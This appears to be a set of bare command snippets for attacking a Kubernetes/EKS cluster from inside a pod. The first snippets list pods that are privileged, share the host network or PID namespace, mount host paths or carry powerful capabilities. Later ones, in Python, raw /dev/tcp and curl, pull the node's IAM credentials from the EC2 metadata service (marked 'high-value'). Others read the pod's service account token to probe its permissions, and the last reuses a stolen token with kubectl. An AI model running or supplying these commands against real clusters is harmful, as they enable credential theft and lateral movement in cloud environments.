```
kubectl get pods -A --field-selector spec.nodeName=<node-name> -o json \
  | jq -r '.items[] | select(
      .spec.hostNetwork == true or .spec.hostPID == true
      or any(.spec.containers[]; .securityContext.privileged == true)
      or any(.spec.volumes[]?; has("hostPath"))
    ) | "\(.metadata.namespace)/\(.metadata.name)"'

```
```

    kubectl get pods -A --field-selector spec.nodeName=<node-name> \
  -o jsonpath='{range .items[*]}{.metadata.namespace}{"/"}{.metadata.name}{"\t"}{.spec.hostNetwork}{"\t"}{.spec.hostPID}{"\t"}{.spec.containers[*].securityContext.privileged}{"\n"}{end}' \
  | grep -E 'true'
```

```
  kubectl get pods -A --field-selector spec.nodeName=<node-name> -o json \
  | jq -r '
    .items[]
    | {
        ns: .metadata.namespace,
        name: .metadata.name,
        reasons: (
          []
          + (if .spec.hostNetwork == true then ["hostNetwork"] else [] end)
          + (if .spec.hostPID == true     then ["hostPID"]     else [] end)
          + (if .spec.hostIPC == true     then ["hostIPC"]     else [] end)
          + (if any(.spec.containers[]; .securityContext.privileged == true)
               then ["privileged"] else [] end)
          + (if any(.spec.volumes[]?; has("hostPath"))
               then ["hostPath"] else [] end)
          + (if (.spec.automountServiceAccountToken != false)
                and ((.spec.serviceAccountName // "default") != "default")
               then ["saToken:" + .spec.serviceAccountName] else [] end)
          + ([ .spec.containers[].securityContext.capabilities.add[]? ]
               | map(select(
                   . == "SYS_ADMIN" or . == "NET_RAW"   or . == "NET_ADMIN"
                   or . == "SYS_PTRACE" or . == "SYS_MODULE" or . == "DAC_READ_SEARCH"
                   or . == "ALL"))
               | if length > 0 then ["caps:" + join(",")] else [] end)
        )
      }
    | select(.reasons | length > 0)
    | "\(.ns)/\(.name)\t\(.reasons | join(", "))"
  ' \
  | column -t -s $'\t'
```


```
python3 -c '
import urllib.request as u
t=u.urlopen(u.Request("http://169.254.169.254/latest/api/token",method="PUT",
  headers={"X-aws-ec2-metadata-token-ttl-seconds":"60"})).read().decode()
role=u.urlopen(u.Request("http://169.254.169.254/latest/meta-data/iam/security-credentials/",
  headers={"X-aws-ec2-metadata-token":t})).read().decode()
print(role)
print(u.urlopen(u.Request("http://169.254.169.254/latest/meta-data/iam/security-credentials/"+role,
  headers={"X-aws-ec2-metadata-token":t})).read().decode())
'
```


```
exec 3<>/dev/tcp/169.254.169.254/80
printf 'PUT /latest/api/token HTTP/1.1\r\nHost: 169.254.169.254\r\nX-aws-ec2-metadata-token-ttl-seconds: 60\r\nConnection: close\r\n\r\n' >&3
TOK=$(cat <&3 | tail -1)

# use it
exec 3<>/dev/tcp/169.254.169.254/80
printf 'GET /latest/meta-data/iam/security-credentials/ HTTP/1.1\r\nHost: 169.254.169.254\r\nX-aws-ec2-metadata-token: %s\r\nConnection: close\r\n\r\n' "$TOK" >&3
cat <&3
```

```
# 0a. what can the SA token do?
NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
API=https://kubernetes.default.svc
kubectl auth can-i --list 2>/dev/null    # if kubectl is in-pod
curl -sk -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  -X POST "$API/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \
  -d "{\"kind\":\"SelfSubjectRulesReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"spec\":{\"namespace\":\"$NS\"}}"

# 0b. EKS node IAM creds via IMDSv2  ← high-value
T=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
      -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
ROLE=$(curl -s -H "X-aws-ec2-metadata-token: $T" \
      http://169.254.169.254/latest/meta-data/iam/security-credentials/)
curl -s -H "X-aws-ec2-metadata-token: $T" \
      http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE

```

```
kubectl get pods -A -o wide --token "$nodeimds" --field-selector spec.nodeName=<nodename>
```
